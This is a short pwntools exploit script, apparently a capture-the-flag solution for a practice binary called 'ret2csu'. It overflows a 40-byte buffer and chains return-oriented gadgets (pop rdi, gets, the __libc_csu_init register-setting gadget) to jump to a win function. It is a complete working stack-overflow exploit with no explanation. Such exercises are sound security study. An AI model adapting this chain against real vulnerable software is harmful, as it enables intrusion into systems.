from pwn import *

elf = ELF("./ret2csu")
p  = elf.process()
gdb.attach(p)

win_addr = 0x401156 
POP_chain = 0x40121a 
REG_call = 0x401200 
prdi_ret = 0x401223
rw_section = 0x404100
gets_plt = 0x401060

payload = "A" * 40
payload += p64(prdi_ret)
payload += p64(rw_section)
payload += p64(gets_plt)
payload += p64(POP_chain)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0xdeadbeef)
payload += p64(rw_section)
payload += p64(REG_call)

p.recvuntil("me\n")
p.sendline(payload)
p.sendline(p64(win_addr))
text = p.recvall()

print text
